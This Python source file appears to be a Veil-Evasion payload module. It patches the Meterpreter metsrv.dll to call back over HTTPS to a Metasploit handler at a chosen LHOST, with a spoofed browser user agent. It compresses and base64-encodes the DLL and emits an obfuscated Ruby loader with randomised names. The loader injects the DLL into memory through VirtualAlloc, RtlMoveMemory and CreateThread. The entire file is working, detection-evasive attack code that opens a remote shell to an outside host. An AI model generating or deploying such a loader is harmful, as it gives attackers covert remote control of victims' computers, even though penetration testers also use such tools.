"""

Reads in metsrv.dll, patches it with appropriate options for a
meterpreter reverse_https payload compresses/base64 encodes it
and then builds a ruby injection wrapper to inject the contained
meterpreter dll into memory.

A lot of code taken from the python contained modules and modified for ruby
Original python code by harmj0y

Module by @christruncer

"""

import struct, string, random, sys, os

from modules.common import helpers
#from modules.common import encryption
from modules.common import patch

import settings


class Payload:

    def __init__(self):
        # required options
        self.description = "Self contained meterpreter https ruby payload"
        self.language = "ruby"
        self.extension = "rb"
        self.rating = "Normal"

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    #"USE_CRYPTER"    : ["N", "Use the Ruby encrypter"],
                                    "INJECT_METHOD"  : ["virtual", "[virtual]alloc"],
                                    "LHOST"          : ["", "IP of the Metasploit handler"],
                                    "LPORT"          : ["443", "Port of the Metasploit handler"]
                                }


    def generate(self):

        # get the main meterpreter .dll with the header/loader patched
        meterpreterDll = patch.headerPatch()

        # turn on SSL
        meterpreterDll = patch.patchTransport(meterpreterDll, True)

        # replace the URL
        urlString = "https://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + helpers.genHTTPChecksum() + "/\x00"
        meterpreterDll = patch.patchURL(meterpreterDll, urlString)

        # replace in the UA
        meterpreterDll = patch.patchUA(meterpreterDll, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00")

        # compress/base64 encode the dll
        compressedDll = helpers.deflate(meterpreterDll)

        # actually build out the payload
        payloadCode = ""

        payloadCode = "require 'rubygems';require 'win32/api';require 'socket';require 'base64';require 'zlib';include Win32\n"
        payloadCode += "exit if Object.const_defined?(:Ocra)\n"

        # randomly generate out variable names
        payloadName = helpers.randomString().lower()
        ptrName = helpers.randomString().lower()
        threadName = helpers.randomString().lower()
        Shellcode = helpers.randomString().lower()
        randInflateFuncName = helpers.randomString().lower()
        randb64stringName = helpers.randomString().lower()
        randVarName = helpers.randomString().lower()

        # deflate function
        payloadCode += "def "+randInflateFuncName+"("+randb64stringName+")\n"
        payloadCode += "  " + randVarName + " = Base64.decode64("+randb64stringName+")\n"
        payloadCode += "  zstream = Zlib::Inflate.new(-Zlib::MAX_WBITS)\n"
        payloadCode += "  buf = zstream.inflate("+ randVarName +")\n"
        payloadCode += "  zstream.finish\n"
        payloadCode += "  zstream.close\n"
        payloadCode += "  return buf\n"
        payloadCode += "end\n\n"

        payloadCode += Shellcode + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"

        payloadCode += "v = API.new('VirtualAlloc', 'IIII', 'I');r = API.new('RtlMoveMemory', 'IPI', 'V');c = API.new('CreateThread', 'IIIIIP', 'I');w = API.new('WaitForSingleObject', 'II', 'I')\n"
        payloadCode += "%s = %s\n" %(payloadName, Shellcode)
        payloadCode += "%s = v.call(0,(%s.length > 0x1000 ? %s.length : 0x1000), 0x1000, 0x40)\n" %(ptrName,payloadName,payloadName)
        payloadCode += "x = r.call(%s,%s,%s.length); %s = c.call(0,0,%s,0,0,0); x = w.call(%s,0xFFFFFFF)\n" %(ptrName,payloadName,payloadName,threadName,ptrName,threadName)

        #if self.required_options["USE_CRYPTER"][0].lower() == "y":
        #    payloadCode = encryption.rubyCrypter(payloadCode)

        return payloadCode
